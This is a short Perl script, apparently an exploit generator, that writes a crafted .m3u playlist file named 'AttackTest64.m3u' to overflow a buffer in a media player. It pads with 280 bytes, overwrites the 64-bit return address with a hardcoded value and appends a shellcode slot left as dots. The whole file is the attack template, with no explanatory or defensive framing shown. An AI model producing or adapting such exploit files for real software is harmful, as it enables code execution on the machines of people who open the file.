my $file = "AttackTest64.m3u";
my $junk = "\x41" x 280;
my $rip  = "\xC9\x61\xF4\x6B\xF8\x7F\x00\x00";
my $shellcode = "...........";
open($FILE, ">$file");
print $FILE $junk.$rip.$shellcode;
close($FILE);
print "m3u File Created Successfully \n";
